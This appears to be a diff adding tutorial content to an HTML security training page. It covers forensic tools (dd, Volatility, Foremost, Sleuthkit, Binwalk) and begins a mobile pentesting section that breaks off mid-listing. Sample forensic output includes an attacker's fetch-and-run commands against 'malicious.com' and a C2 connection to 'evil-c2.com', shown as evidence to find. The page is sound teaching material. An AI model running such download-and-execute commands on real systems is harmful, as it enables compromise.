@@ -143,14 +143,819 @@
         <!-- SECTION 1: Digital Forensics & Memory Analysis -->
         <section id="digital-forensics" class="section">
             <h2 class="section-title">Digital Forensics & Memory Analysis</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Digital forensics is like being a detective for computers. When a computer gets hacked or a crime happens, forensic investigators examine the digital evidence left behind—deleted files, memory dumps, logs, hidden data. In this section, you'll learn how to analyze disk images, recover deleted files, examine memory for malware, and uncover evidence that attackers tried to hide. Think CSI, but for cybersecurity!</p>
+
+            <h3>What Even IS Digital Forensics?</h3>
+            
+            <div class="metaphor-box">
+                <h4>Digital Forensics = Crime Scene Investigation for Computers</h4>
+                <p><strong>Crime scene:</strong> A hacker broke into a company server<br>
+                <strong>Evidence:</strong> Hard drive image, RAM dump, network logs<br>
+                <strong>Your job:</strong> Find out WHO did it, WHAT they did, WHEN it happened, and HOW they got in<br><br>
+                Just like a real detective:<br>
+                • Preserve the evidence (don't modify original data!)<br>
+                • Analyze artifacts (files, logs, memory)<br>
+                • Timeline reconstruction (what happened when?)<br>
+                • Report findings (document everything)<br><br>
+                Digital forensics tools help you examine data without changing it, recover deleted files, and find hidden clues!</p>
+            </div>
+
+            <h3>Part 1: Autopsy - The Ultimate Disk Forensics Tool</h3>
+            
+            <p><strong>Autopsy</strong> is a GUI-based forensic tool that makes analyzing disk images EASY. It's like having a magnifying glass for hard drives!</p>
+
+            <h4>What Can Autopsy Do?</h4>
+            
+            <div class="code">✅ Analyze disk images (entire hard drive copies)
+✅ Recover deleted files (from recycle bin or permanently deleted)
+✅ Extract metadata (when files were created, modified, accessed)
+✅ Search for keywords across entire disk
+✅ Timeline analysis (what happened at what time)
+✅ Hash analysis (verify file integrity, detect known bad files)
+✅ Web history (browser history, cookies, downloads)
+✅ Email analysis (extract emails from mail clients)</div>
+
+            <h4>Starting Autopsy</h4>
+            
+            <div class="code"># Launch Autopsy (GUI opens in browser)
+autopsy
+
+# Output:
+# Open Web Browser on http://localhost:9999/autopsy
+# 
+# Now open your browser and go to that URL!</div>
+
+            <div class="info-box">
+                <h4>What's a Disk Image?</h4>
+                <p>A disk image is a PERFECT copy of an entire hard drive, USB stick, or SD card. It's like taking a photograph of the drive—every file, every deleted file, every bit of data is captured EXACTLY as it was.<br><br>
+                <strong>Why use images instead of the original drive?</strong><br>
+                • Preserve evidence (don't risk modifying the original)<br>
+                • Work on a copy (safe to experiment)<br>
+                • Repeatability (other investigators can analyze the same data)<br><br>
+                Common formats: <span class="inline-code">.dd</span> (raw image), <span class="inline-code">.E01</span> (EnCase format), <span class="inline-code">.AFF</span> (Advanced Forensic Format)</p>
+            </div>
+
+            <h4>Creating a Disk Image with dd</h4>
+            
+            <div class="code"># dd = "disk dump" - creates byte-for-byte copy of a drive
+# 
+# Basic syntax:
+# dd if=INPUT of=OUTPUT bs=BLOCK_SIZE
+#
+# if = input file (source drive)
+# of = output file (destination image)
+# bs = block size (how much data to copy at once)
+
+# Example: Image a USB drive
+sudo dd if=/dev/sdb of=/root/evidence/usb_image.dd bs=4M status=progress
+
+# Let's break this down:
+# if=/dev/sdb         → Source: USB drive (sdb is the device name)
+# of=usb_image.dd     → Destination: File where image will be saved
+# bs=4M               → Block size: Copy 4 megabytes at a time (faster!)
+# status=progress     → Show progress bar while copying
+
+# Output while running:
+# 1073741824 bytes (1.1 GB) copied, 45 s, 23.9 MB/s
+# [Shows how much data copied and speed]
+
+# When done:
+# 2048+0 records in
+# 2048+0 records out
+# 2147483648 bytes (2.1 GB) copied, 89.5 s, 24.0 MB/s</div>
+
+            <div class="warning-box">
+                <h4>⚠️ BE EXTREMELY CAREFUL WITH dd!</h4>
+                <p>If you mix up <span class="inline-code">if</span> and <span class="inline-code">of</span>, you'll OVERWRITE your source drive and DESTROY THE EVIDENCE!<br><br>
+                <strong>WRONG (DISASTER):</strong><br>
+                <span class="inline-code">sudo dd if=/root/evidence/usb_image.dd of=/dev/sdb</span><br>
+                ↑ This OVERWRITES the USB drive with the image file!<br><br>
+                <strong>Always double-check:</strong><br>
+                • if = where you're copying FROM (source)<br>
+                • of = where you're copying TO (destination)<br><br>
+                <strong>Pro tip:</strong> Use <span class="inline-code">lsblk</span> to verify device names before running dd!</p>
+            </div>
+
+            <h4>Using Autopsy to Analyze a Disk Image</h4>
+            
+            <div class="code"># Step 1: Launch Autopsy
+autopsy
+
+# Step 2: Open http://localhost:9999/autopsy in browser
+
+# Step 3: Create New Case
+# - Case Name: "USB_Investigation_2026"
+# - Description: "Analyzing suspicious USB drive"
+# - Investigator: "Your Name"
+# Click "New Case"
+
+# Step 4: Add Host
+# - Host Name: "Suspect_USB"
+# - Description: "USB drive from suspect's desk"
+# Click "Add Host"
+
+# Step 5: Add Image
+# - Click "Add Image"
+# - Image Type: "Partition"
+# - Image File: Browse to /root/evidence/usb_image.dd
+# - Import Method: "Symlink" (faster) or "Copy" (safer)
+# Click "Next" → "Add"
+
+# Step 6: File Analysis
+# Now you can:
+# - Browse all files (even deleted ones!)
+# - Search for keywords
+# - View file metadata
+# - Extract files
+# - Generate timeline</div>
+
+            <h4>Autopsy's Key Features</h4>
+            
+            <div class="card-grid">
+                <div class="card">
+                    <h4>File Browser</h4>
+                    <p>Navigate the entire file system. See EVERYTHING—including deleted files marked with an X. Click any file to view its contents, metadata, and hex dump.</p>
+                </div>
+                <div class="card">
+                    <h4>Keyword Search</h4>
+                    <p>Search entire disk for words like "password", "secret", email addresses, credit card numbers. Finds hidden data in files, slack space, unallocated clusters.</p>
+                </div>
+                <div class="card">
+                    <h4>Timeline</h4>
+                    <p>See WHEN every file was created, modified, accessed, deleted. Reconstruct exactly what the user did hour by hour!</p>
+                </div>
+                <div class="card">
+                    <h4>Hash Database</h4>
+                    <p>Compare file hashes against known databases. Identify malware, illegal files, or verify legitimate system files haven't been tampered with.</p>
+                </div>
+            </div>
+
+            <h3>Part 2: Volatility - Memory Forensics Master</h3>
+            
+            <p><strong>Volatility</strong> analyzes RAM dumps to find evidence of malware, hidden processes, network connections, and malicious activity that only exists in memory!</p>
+
+            <div class="metaphor-box">
+                <h4>Why Analyze Memory?</h4>
+                <p>Think of RAM as short-term memory for a computer:<br><br>
+                <strong>Hard Drive:</strong> Long-term storage (files saved forever)<br>
+                <strong>RAM:</strong> Active memory (what's running RIGHT NOW)<br><br>
+                Sophisticated malware runs ONLY in memory—no files on disk! It injects itself into processes, hides from antivirus, and disappears when the computer reboots. But if you capture RAM before it reboots, Volatility can find it!<br><br>
+                Memory dumps contain:<br>
+                • Running processes (including hidden malware)<br>
+                • Network connections (where malware is connecting)<br>
+                • Open files (what programs are accessing)<br>
+                • Encryption keys (sometimes recoverable!)<br>
+                • Command history (what commands were run)<br>
+                • Passwords in memory (cleartext!)</p>
+            </div>
+
+            <h4>Capturing Memory with LiME (Linux) or DumpIt (Windows)</h4>
+            
+            <div class="code"># On Linux: Use LiME (Linux Memory Extractor)
+# First, install LiME (comes with Kali)
+cd /usr/src/lime
+make
+
+# Capture memory
+sudo insmod lime.ko "path=/root/evidence/memory.lime format=lime"
+
+# Output:
+# [LiME] Allocated memory range: 0x0000000000000000 - 0x000000007fffffff
+# [LiME] Writing 8GB to /root/evidence/memory.lime
+# [This takes a few minutes depending on RAM size]
+
+# On Windows: Use DumpIt or FTK Imager
+# DumpIt.exe → Click "Start" → Saves memory.dmp</div>
+
+            <h4>Volatility Basics - Finding the Memory Profile</h4>
+            
+            <div class="code"># Volatility needs to know what OS version the memory dump is from
+# First, identify the profile:
+
+volatility -f memory.lime imageinfo
+
+# Output:
+# Suggested Profile(s) : LinuxUbuntu2004x64, LinuxDebian10x64
+# AS Layer1 : LinuxAMD64PagedMemory (Kernel AS)
+# DTB : 0x1aa000L
+# 
+# The "Suggested Profile" tells you what OS this dump is from!
+# Now use that profile for all subsequent commands</div>
+
+            <div class="info-box">
+                <h4>What's a Profile?</h4>
+                <p>Different operating systems store data differently in memory. Volatility needs to know the exact OS version to correctly parse the memory structures.<br><br>
+                <strong>Think of it like languages:</strong><br>
+                If you're reading a book, you need to know if it's in English, Spanish, or Chinese to understand it. Similarly, Volatility needs to know if the memory is from Windows 10, Ubuntu 20.04, or macOS to parse it correctly!<br><br>
+                Always run <span class="inline-code">imageinfo</span> first to find the right profile!</p>
+            </div>
+
+            <h4>Volatility Commands - The Essential Plugins</h4>
+            
+            <div class="code"># 1. List running processes
+volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_pslist
+
+# Output:
+# Offset      Name      Pid    PPid   Uid    Start Time
+# 0x88007c00  init      1      0      0      2026-01-07 10:23:45
+# 0x88007e00  systemd   1234   1      0      2026-01-07 10:24:12
+# 0x88008000  bash      2345   1234   1000   2026-01-07 11:15:33
+# 0x88008200  malware   3456   1      0      2026-01-07 14:22:19  ← Suspicious!
+# 
+# Shows every process that was running, including:
+# - PID (process ID)
+# - PPID (parent process ID - who started this process)
+# - User who ran it (Uid 0 = root)
+# - When it started
+
+# 2. Find hidden/injected processes
+volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_psxview
+
+# This compares multiple process-listing methods
+# If a process appears in one method but not another, it's HIDDEN!
+# Common malware technique: remove process from task list but keep running
+
+# 3. List network connections
+volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_netstat
+
+# Output:
+# Protocol  Local Address        Foreign Address      State      PID
+# TCP       192.168.1.10:443     8.8.8.8:443          ESTABLISHED 2345
+# TCP       192.168.1.10:4444    evil-c2.com:4444     ESTABLISHED 3456  ← C2!
+# 
+# Shows what connections were active
+# Look for suspicious IPs, known C2 servers, unusual ports
+
+# 4. Dump process memory
+volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_procdump -p 3456 -D /root/evidence/
+
+# Extracts the entire memory of process 3456 (the suspicious one)
+# Creates file: 3456.dmp
+# Now you can analyze the malware's code directly!
+
+# 5. Extract command history
+volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_bash
+
+# Output:
+# Pid    Command Time                 Command
+# 2345   2026-01-07 11:15:33          cd /tmp
+# 2345   2026-01-07 11:16:12          wget http://malicious.com/payload
+# 2345   2026-01-07 11:16:45          chmod +x payload
+# 2345   2026-01-07 11:17:02          ./payload
+# 
+# Shows EXACTLY what commands the attacker ran!</div>
+
+            <h4>Volatility for Windows Memory</h4>
+            
+            <div class="code"># Windows has different plugins but same workflow:
+
+# 1. Identify profile
+volatility -f memory.dmp imageinfo
+
+# Output:
+# Suggested Profile(s): Win10x64_19041
+
+# 2. List processes
+volatility -f memory.dmp --profile=Win10x64_19041 pslist
+
+# 3. Find DLLs loaded by a process
+volatility -f memory.dmp --profile=Win10x64_19041 dlllist -p 1234
+
+# Shows all libraries a process loaded
+# Malware often injects malicious DLLs into legitimate processes!
+
+# 4. Scan for malware indicators
+volatility -f memory.dmp --profile=Win10x64_19041 malfind
+
+# Automatically detects suspicious memory regions:
+# - Executable code in unusual places
+# - Hidden/injected code
+# - Packed/encrypted sections
+
+# Output:
+# Process: explorer.exe Pid: 2468
+# Address: 0x7fef0000
+# Protection: PAGE_EXECUTE_READWRITE (suspicious!)
+# 
+# Hexdump:
+# 4d 5a 90 00 03 00 00 00  MZ......  ← PE header (executable!)
+# [This is injected malware!]
+
+# 5. Extract registry hives
+volatility -f memory.dmp --profile=Win10x64_19041 hivelist
+
+# Shows all registry hives in memory
+# You can then dump them and analyze:
+volatility -f memory.dmp --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Shows programs set to run at startup (persistence mechanism!)</div>
+
+            <div class="warning-box">
+                <h4>Memory Analysis Takes TIME!</h4>
+                <p>Analyzing an 8GB memory dump can take hours. Volatility scans the entire dump for each command. Be patient!<br><br>
+                <strong>Tips for faster analysis:</strong><br>
+                • Use <span class="inline-code">--output=json</span> to save results for later review<br>
+                • Run multiple plugins at once in separate terminals<br>
+                • Focus on specific processes if you have leads<br>
+                • Consider using <span class="inline-code">bulk_extractor</span> first for quick wins</p>
+            </div>
+
+            <h3>Part 3: Foremost - File Carving Master</h3>
+            
+            <p><strong>Foremost</strong> recovers deleted files from disk images by looking for file signatures (magic bytes) without needing the file system!</p>
+
+            <div class="metaphor-box">
+                <h4>File Carving = Finding Puzzle Pieces in a Junkyard</h4>
+                <p>Imagine a shredded document. The pieces are scattered, but each piece has clues (edges, colors, text). File carving is similar:<br><br>
+                Every file type has a unique "signature" (magic bytes) at the start:<br>
+                • JPEG: <span class="inline-code">FF D8 FF</span><br>
+                • PDF: <span class="inline-code">25 50 44 46</span> (literally "%PDF")<br>
+                • ZIP: <span class="inline-code">50 4B 03 04</span><br><br>
+                Foremost scans the ENTIRE disk looking for these signatures, then extracts the complete file—even if it's deleted, the file system is damaged, or it's in unallocated space!<br><br>
+                It's like having X-ray vision for hard drives!</p>
+            </div>
+
+            <h4>Using Foremost</h4>
+            
+            <div class="code"># Basic usage:
+foremost -i INPUT_IMAGE -o OUTPUT_DIR
+
+# Example: Carve files from USB image
+foremost -i /root/evidence/usb_image.dd -o /root/evidence/carved_files/
+
+# Foremost scans the image and extracts:
+# - All JPEGs
+# - All PDFs
+# - All DOC/DOCX files
+# - All ZIP files
+# - PNG, GIF, AVI, MPG, WAV, etc.
+
+# Output while running:
+# Processing: /root/evidence/usb_image.dd
+# [Shows progress bar]
+
+# When done, check the output directory:
+ls /root/evidence/carved_files/
+
+# Output:
+# jpg/     ← All recovered JPEG files
+# pdf/     ← All recovered PDFs
+# zip/     ← All recovered ZIPs
+# audit.txt ← Summary of what was found</div>
+
+            <h4>Foremost Flags</h4>
+            
+            <div class="code"># -t : Specify file types to carve (faster than carving everything)
+foremost -t jpg,pdf,doc -i image.dd -o output/
+
+# Only carves JPEGs, PDFs, and DOC files
+
+# -v : Verbose mode (show more details)
+foremost -v -i image.dd -o output/
+
+# -q : Quiet mode (no output, just run)
+foremost -q -i image.dd -o output/
+
+# -c : Use custom configuration file
+foremost -c /path/to/custom.conf -i image.dd -o output/
+
+# Custom config lets you define your own file signatures!
+
+# -d : Enable indirect block detection (for fragmented files)
+foremost -d -i image.dd -o output/
+
+# Tries harder to recover fragmented files (slower but more thorough)</div>
+
+            <h4>Custom Configuration for Foremost</h4>
+            
+            <div class="code"># Create custom foremost config to carve unusual file types
+# Config file format: filetype case header footer maxsize
+# 
+# Example config (/root/custom_foremost.conf):
+
+# Carve Bitcoin wallet files
+dat y \x35\x05\x00\x00\x00\x00\x00\x00 \xff\xff\xff\xff 5000000
+
+# Carve PGP private keys
+asc y -----BEGIN\sPGP -----END\sPGP 10000
+
+# Carve SSH private keys  
+pem y -----BEGIN\sRSA -----END\sRSA 10000
+
+# Use custom config:
+foremost -c /root/custom_foremost.conf -i image.dd -o output/</div>
+
+            <div class="info-box">
+                <h4>When to Use File Carving</h4>
+                <p><strong>Use Foremost when:</strong><br>
+                • Files have been permanently deleted (not in recycle bin)<br>
+                • File system is corrupted/damaged<br>
+                • Suspect reformatted the drive<br>
+                • You need to recover specific file types quickly<br><br>
+                <strong>Limitations:</strong><br>
+                • Can't recover filenames (files are named sequentially like 00000001.jpg)<br>
+                • Can't recover directory structure<br>
+                • Fragmented files might not carve correctly<br>
+                • Overwrites make recovery impossible<br><br>
+                For better results, use Foremost + Autopsy together!</p>
+            </div>
+
+            <h3>Part 4: Sleuthkit - Command-Line Forensics Powerhouse</h3>
+            
+            <p><strong>Sleuthkit</strong> is a collection of command-line tools for forensic analysis. Autopsy uses Sleuthkit under the hood!</p>
+
+            <h4>Key Sleuthkit Tools</h4>
+            
+            <div class="code"># mmls - Display partition layout
+mmls image.dd
+
+# Output:
+# DOS Partition Table
+# Offset    Sector  Start    End      Length   Description
+# 0000000000 0000   0000000  0000000  0000001  Primary Table (#0)
+# 0000000001 0001   0000001  0002047  0002047  Unallocated
+# 0000001048576 2048  0002048  0502399  0500352  Linux (0x83)
+# 
+# Shows you where each partition starts/ends
+# Useful for finding hidden partitions!
+
+# fsstat - Show file system info
+fsstat image.dd
+
+# Output:
+# FILE SYSTEM INFORMATION
+# File System Type: Ext4
+# Volume Name: USB_DRIVE
+# Volume ID: a1b2c3d4
+# Last Written: 2026-01-07 14:22:19 PST
+# Last Checked: 2026-01-01 09:00:00 PST
+# Block Size: 4096
+# Total Blocks: 512000
+# Free Blocks: 123456
+
+# fls - List files (including deleted!)
+fls -r image.dd
+
+# Output:
+# r/r 12: secret.txt
+# r/r * 24: deleted_file.pdf  ← Asterisk means DELETED!
+# d/d 36: Documents
+# r/r 48: photo.jpg
+# 
+# -r flag makes it recursive (shows files in subdirectories)
+
+# icat - Extract file by inode number
+icat image.dd 24 > recovered_file.pdf
+
+# Extracts the deleted file with inode 24!
+# Inode = unique file identifier (like a social security number for files)
+
+# ils - List deleted inodes
+ils image.dd
+
+# Shows all deleted files that can potentially be recovered
+
+# istat - Show detailed inode info
+istat image.dd 24
+
+# Output:
+# inode: 24
+# Allocated: No (DELETED!)
+# File Type: Regular File
+# Size: 524288 bytes
+# Created: 2026-01-05 10:15:30 PST
+# Modified: 2026-01-05 10:20:45 PST
+# Accessed: 2026-01-07 14:10:22 PST
+# Deleted: 2026-01-07 14:22:19 PST</div>
+
+            <h4>Timeline Analysis with Sleuthkit</h4>
+            
+            <div class="code"># Create a timeline of ALL file activity
+# Step 1: Extract timeline data
+fls -r -m / image.dd > timeline.body
+
+# Step 2: Convert to human-readable format
+mactime -b timeline.body -d > timeline.txt
+
+# Step 3: View timeline
+cat timeline.txt
+
+# Output:
+# Date,Size,Type,Mode,UID,GID,Meta,File Name
+# 2026-01-07 10:15:30, 1024, .a.., -rw-r--r--, 1000, 1000, 12, /home/user/secret.txt
+# 2026-01-07 14:22:19, 524288, .a.., -rw-r--r--, 1000, 1000, 24, /home/user/deleted.pdf (deleted)
+# 
+# Shows EXACTLY when every file was created, modified, accessed, deleted!
+# Perfect for reconstructing attacker's actions</div>
+
+            <h3>Part 5: bulk_extractor - Fast Evidence Scanner</h3>
+            
+            <p><strong>bulk_extractor</strong> scans disk images for useful information WITHOUT parsing the file system. It's FAST and finds things other tools miss!</p>
+
+            <div class="code"># Basic usage:
+bulk_extractor -o OUTPUT_DIR INPUT_IMAGE
+
+# Example:
+bulk_extractor -o /root/evidence/bulk_results/ /root/evidence/usb_image.dd
+
+# bulk_extractor automatically extracts:
+# ✅ Email addresses
+# ✅ URLs
+# ✅ Credit card numbers
+# ✅ Phone numbers  
+# ✅ Social security numbers
+# ✅ Bitcoin addresses
+# ✅ GPS coordinates (EXIF data)
+# ✅ Encryption keys
+# ✅ Domain names
+# ✅ Search terms
+
+# Output files created:
+ls /root/evidence/bulk_results/
+
+# Output:
+# email.txt            ← All email addresses found
+# url.txt              ← All URLs found
+# ccn.txt              ← Credit card numbers (!!!)
+# telephone.txt        ← Phone numbers
+# domain.txt           ← Domain names
+# gps.txt              ← GPS coordinates from photos
+# rfc822.txt           ← Email messages
+# wordlist.txt         ← Unique words (useful for password cracking!)</div>
+
+            <div class="info-box">
+                <h4>Why bulk_extractor is AMAZING</h4>
+                <p><strong>Speed:</strong> Scans gigabytes in minutes (doesn't care about file system)<br>
+                <strong>Thoroughness:</strong> Finds data in unallocated space, compressed files, memory dumps<br>
+                <strong>Automation:</strong> No configuration needed—just point and shoot!<br><br>
+                <strong>Real-world use case:</strong><br>
+                Investigator has 100GB disk image. Instead of manually searching, run bulk_extractor overnight. Wake up to nicely organized lists of emails, URLs, and sensitive data. Follow the leads from there!<br><br>
+                It's like having a robot assistant that reads EVERYTHING and highlights the important stuff!</p>
+            </div>
+
+            <h4>bulk_extractor Advanced Options</h4>
+            
+            <div class="code"># -j : Number of threads (faster on multi-core systems)
+bulk_extractor -j 8 -o output/ image.dd
+
+# Uses 8 CPU cores (4x faster on quad-core!)
+
+# -x : Enable specific scanners
+bulk_extractor -x scan_accts -o output/ image.dd
+
+# Only run the account scanner (finds username/password combos)
+
+# -E : Enable specific extractors
+bulk_extractor -E wordlist -o output/ image.dd
+
+# Extract wordlist for password cracking
+
+# -S : Specify scanner directory (for custom scanners)
+bulk_extractor -S /usr/share/bulk_extractor/scanners -o output/ image.dd
+
+# -q : Quiet mode (no output to screen)
+bulk_extractor -q -o output/ image.dd</div>
+
+            <h3>Part 6: chkrootkit - Rootkit Detection</h3>
+            
+            <p><strong>chkrootkit</strong> checks your system for rootkits—malware that hides itself and other malware from detection!</p>
+
+            <div class="metaphor-box">
+                <h4>Rootkits = The Invisible Man</h4>
+                <p>Normal malware is like a burglar wearing a ski mask—suspicious but visible.<br><br>
+                Rootkits are like invisible burglars:<br>
+                • Hide processes from <span class="inline-code">ps</span> command<br>
+                • Hide files from <span class="inline-code">ls</span> command<br>
+                • Hide network connections from <span class="inline-code">netstat</span><br>
+                • Replace system commands with backdoored versions<br><br>
+                chkrootkit looks for signs of rootkit activity by checking if system commands have been modified and looking for known rootkit signatures!</p>
+            </div>
+
+            <div class="code"># Run chkrootkit (as root)
+sudo chkrootkit
+
+# Output:
+# Checking `amd'... not found
+# Checking `basename'... not infected
+# Checking `biff'... not found
+# Checking `chfn'... not infected
+# Checking `chsh'... not infected
+# Checking `cron'... not infected
+# Checking `date'... not infected
+# [...]
+# Checking `lkm'... You have  5 process hidden for readdir command
+# Checking `lkm'... Warning: Possible LKM Trojan installed  ← ALERT!
+# 
+# Any "Warning" or "INFECTED" is a red flag!
+
+# Check specific tests:
+sudo chkrootkit -x
+
+# Lists all available tests
+
+# Run specific test:
+sudo chkrootkit suspicious_files
+
+# Only checks for suspicious files
+
+# Expert mode (detailed output):
+sudo chkrootkit -x | grep INFECTED
+
+# Shows only infected/suspicious results</div>
+
+            <div class="warning-box">
+                <h4>False Positives Are Common!</h4>
+                <p>chkrootkit sometimes flags legitimate software as "suspicious". Don't panic!<br><br>
+                <strong>Investigate further:</strong><br>
+                • Google the specific warning<br>
+                • Check file hashes against known good versions<br>
+                • Use multiple rootkit scanners (rkhunter, OSSEC)<br>
+                • Compare with clean system<br><br>
+                Real rootkits are RARE on properly maintained systems. Most "detections" are false alarms!</p>
+            </div>
+
+            <h3>Part 7: Binwalk - Firmware Analysis Tool</h3>
+            
+            <p><strong>Binwalk</strong> analyzes, extracts, and reverse-engineers firmware images from routers, IoT devices, embedded systems!</p>
+
+            <div class="code"># Analyze firmware file
+binwalk firmware.bin
+
+# Output:
+# DECIMAL    HEX        DESCRIPTION
+# 0          0x0        uImage header, header CRC: 0x12345678
+# 64         0x40       LZMA compressed data
+# 1048576    0x100000   Squashfs filesystem, little endian
+# 3145728    0x300000   JFFS2 filesystem data
+# 
+# Shows what's INSIDE the firmware:
+# - Boot loader
+# - Compressed data
+# - File systems
+# - Embedded files
+
+# Extract embedded files automatically:
+binwalk -e firmware.bin
+
+# Creates directory: _firmware.bin.extracted/
+# Contains all extracted files and file systems!
+
+# Extract specific signature:
+binwalk --dd='.*' firmware.bin
+
+# Extracts everything it finds</div>
+
+            <h4>Analyzing Router Firmware Example</h4>
+            
+            <div class="code"># 1. Download firmware from manufacturer's website
+wget http://routermaker.com/downloads/router_fw_v2.1.bin
+
+# 2. Analyze with binwalk
+binwalk router_fw_v2.1.bin
+
+# Output shows:
+# - SquashFS file system at offset 0x200000
+
+# 3. Extract file system
+binwalk -e router_fw_v2.1.bin
+
+# 4. Navigate to extracted file system
+cd _router_fw_v2.1.bin.extracted/squashfs-root/
+
+# 5. You can now examine:
+ls -la
+
+# Output:
+# bin/       ← Binaries
+# etc/       ← Configuration files
+# www/       ← Web interface
+# lib/       ← Libraries
+
+# 6. Look for hardcoded passwords
+grep -r "password" etc/
+
+# Output:
+# etc/config.xml: <admin_password>admin123</admin_password>  ← FOUND IT!
+
+# 7. Check web interface for vulnerabilities
+cd www/
+grep -r "eval" .
+
+# Look for dangerous functions like eval(), system(), exec()</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're Now a Digital Forensics Detective!</h4>
+                <p>You've learned:<br><br>
+                ✅ <strong>Autopsy:</strong> GUI forensic analysis, disk image examination<br>
+                ✅ <strong>Volatility:</strong> Memory forensics, finding hidden malware<br>
+                ✅ <strong>Foremost:</strong> File carving, recovering deleted files<br>
+                ✅ <strong>Sleuthkit:</strong> Command-line forensics, timeline analysis<br>
+                ✅ <strong>bulk_extractor:</strong> Fast evidence extraction<br>
+                ✅ <strong>chkrootkit:</strong> Rootkit detection<br>
+                ✅ <strong>Binwalk:</strong> Firmware analysis<br><br>
+                You can now investigate hacked systems, recover deleted evidence, analyze memory dumps, and extract firmware from IoT devices. Digital forensics is like being a detective with superpowers—you can see what happened even when attackers tried to cover their tracks!<br><br>
+                <strong>Practice challenges:</strong><br>
+                • Download practice disk images from forensic CTFs<br>
+                • Analyze your own system's memory<br>
+                • Extract firmware from old routers<br>
+                • Create timeline of your own file activity<br><br>
+                The evidence is ALWAYS there if you know where to look! 🔍</p>
+            </div>
         </section>
 
         <!-- SECTION 2: Mobile Security & App Pentesting -->
         <section id="mobile-security" class="section">
             <h2 class="section-title">Mobile Security & App Pentesting</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
-        </section>
+            <p class="section-intro">Welcome to the world where your phone is no longer just a communication device—it's a treasure chest of secrets, vulnerabilities, and attack vectors! Every app you download, every permission you grant, every API call made in the background... it's all code that can be analyzed, reversed, and potentially exploited. In this section, we're diving deep into the art and science of mobile application penetration testing. Whether you're hunting for hardcoded API keys, bypassing SSL pinning, or hooking into running processes to manipulate app behavior in real-time, this is your complete guide to mobile security from a hacker's perspective.</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Think of Mobile Apps Like Locked Boxes</h4>
+                <p>Imagine every app on your phone is a locked treasure box. Regular users see only the outside—the shiny interface, the buttons, the screens. But as a pentester, you have tools to crack open that box and see what's inside: the actual code, the hidden API endpoints, the secrets developers thought were safe. APKTool is your crowbar, Jadx is your magnifying glass, and Frida is your master key that works while the box is still locked!</p>
+            </div>
+
+            <h3>What is Mobile Penetration Testing?</h3>
+            <p>Mobile penetration testing is the process of systematically analyzing mobile applications (primarily Android and iOS) to identify security vulnerabilities before malicious actors can exploit them. Unlike traditional web pentesting where you're attacking servers and websites, mobile pentesting focuses on the app itself—the code running on millions of devices.</p>
+
+            <div class="info-box">
+                <h4>Why Mobile Security Matters</h4>
+                <p><strong>5+ billion smartphones worldwide.</strong> Each one runs dozens of apps. Banking apps, social media, health trackers, password managers—all storing sensitive data. A single vulnerability in a popular app can expose millions of users to:</p>
+                <ul style="margin-top: 1rem; color: var(--text2);">
+                    <li><strong>Data theft:</strong> Credentials, tokens, personal information</li>
+                    <li><strong>Financial fraud:</strong> Bypassing payment verification, unauthorized transactions</li>
+                    <li><strong>Privacy violations:</strong> Location tracking, microphone/camera access</li>
+                    <li><strong>Malware injection:</strong> Modifying apps to include malicious code</li>
+                </ul>
+            </div>
+
+            <h4>The Mobile Pentesting Process (Overview)</h4>
+            <p>Before we dive into each tool, here's the big picture of how mobile pentesting works:</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>1. Acquisition</h4>
+                    <p>Download the target APK (Android Package) or IPA (iOS App Store Package) from the app store, device, or third-party sources.</p>
+                </div>
+                <div class="card">
+                    <h4>2. Static Analysis</h4>
+                    <p>Decompile the app to examine its code, resources, and manifest files without running it. Look for hardcoded secrets, insecure configurations, and vulnerable code patterns.</p>
+                </div>
+                <div class="card">
+                    <h4>3. Dynamic Analysis</h4>
+                    <p>Run the app in a controlled environment while intercepting network traffic, monitoring file system changes, and hooking into functions to observe runtime behavior.</p>
+                </div>
+                <div class="card">
+                    <h4>4. Vulnerability Assessment</h4>
+                    <p>Identify security issues like insecure data storage, weak crypto, exposed endpoints, SSL pinning that can be bypassed, and insufficient authentication.</p>
+                </div>
+                <div class="card">
+                    <h4>5. Exploitation</h4>
+                    <p>Prove the impact by exploiting vulnerabilities—bypass authentication, extract sensitive data, modify app behavior, or escalate privileges.</p>
+                </div>
+                <div class="card">
+                    <h4>6. Reporting</h4>
+                    <p>Document findings with severity ratings, proof-of-concept code, impact assessment, and remediation recommendations.</p>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h4>⚠️ Legal & Ethical Boundaries</h4>
+                <p><strong>CRITICAL:</strong> Only test apps you have explicit permission to test. This means:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Apps you developed yourself</li>
+                    <li>Apps where you have written authorization from the owner/company</li>
+                    <li>Apps specifically created for training (like DVIA, InsecureBankv2, etc.)</li>
+                </ul>
+                <p style="margin-top: 1rem;"><strong>Reverse engineering commercial apps without permission is often illegal</strong> under laws like the DMCA (USA), Computer Misuse Act (UK), and similar legislation worldwide. Bug bounty programs are your legal avenue for testing real-world apps!</p>
+            </div>
+
+            <h3>Understanding Android Architecture</h3>
+            <p>Before you can hack Android apps, you need to understand what you're hacking. Let's break down Android's architecture from a pentester's perspective:</p>
+
+            <h4>The APK Structure</h4>
+            <p>An APK (Android Package Kit) is essentially a ZIP archive with a specific structure. When you decompile an APK, you'll find:</p>
+
+            <div class="code">
+my-app.apk/
+│
+├── AndroidManifest.xml          ← App permissions, components, metadata
+├── classes.dex                  ← Compiled Dalvik bytecode (the actual code)
+├── classes2.dex                 ← Additional DEX files (large apps)
+├── resources.arsc               ← Compiled resources (strings, layouts, etc.)
+├── META-INF/                    ← App signatures and certificates
+│   ├── MANIFEST.MF
+│   ├── CERT.SF
+│   └── CERT.RSA
+├── lib/                         ← Native libraries (.so files)
+│   ├── armeabi-v7a/            ← ARM 32-bit libraries
+│   ├── arm64-v8a/              ← ARM 64-bit libraries
+│   ├── x86/                    ← x86 32-bit libraries
+│   └── x86_64/                 ← x86 64-bit libraries
+├── assets/                      ← Raw asset files (databases, configs, etc.)
